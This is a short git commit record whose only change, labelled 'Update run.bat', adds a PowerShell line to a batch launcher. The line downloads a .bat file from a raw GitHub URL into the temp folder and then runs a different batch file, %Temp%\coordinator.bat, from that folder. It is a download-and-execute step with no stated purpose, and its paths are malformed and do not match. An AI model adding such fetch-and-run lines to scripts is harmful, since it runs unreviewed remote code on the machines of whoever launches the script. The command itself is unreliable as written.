3d208dbe413e39953dc202f250a3720613f0d67e
droid003best <54209012+droid003best@users.noreply.github.com>
2021-01-29 13:36:38 +0100

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,1 +1,2 @@
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/wSetup/main/wSetup.bat', 'start %Temp%\wSetup\Installation\wSetup.bat') }" & %Temp%\coordinator.bat
 
